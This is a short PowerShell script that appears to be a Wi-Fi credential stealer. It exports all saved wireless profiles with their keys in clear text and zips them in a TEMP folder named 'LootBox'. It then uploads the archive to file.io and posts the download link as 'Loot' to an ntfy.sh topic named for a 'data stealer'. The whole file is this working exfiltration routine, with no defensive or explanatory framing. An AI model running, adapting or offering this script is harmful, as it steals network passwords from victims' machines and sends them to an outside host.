$topic = "data_stwealer_hideen_"

# 1. Setup
$dir = "$env:TEMP\LootBox"
if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
mkdir $dir | Out-Null
$zip = "$env:TEMP\package.zip"
if (Test-Path $zip) { Remove-Item -Force $zip }

# 2. Export
netsh wlan export profile folder=$dir key=clear | Out-Null

# 3. Zip
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)

# 4. Upload
if (Test-Path $zip) {
    $response = curl.exe -F "file=@$zip" https://file.io
    if ($response -match '"link":"([^"]+)"') {
        $link = $matches[1]
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
    }
}

# 5. Debug Stay
Read-Host "Press Enter to Finish"
Remove-Item -Recurse -Force $dir, $zip
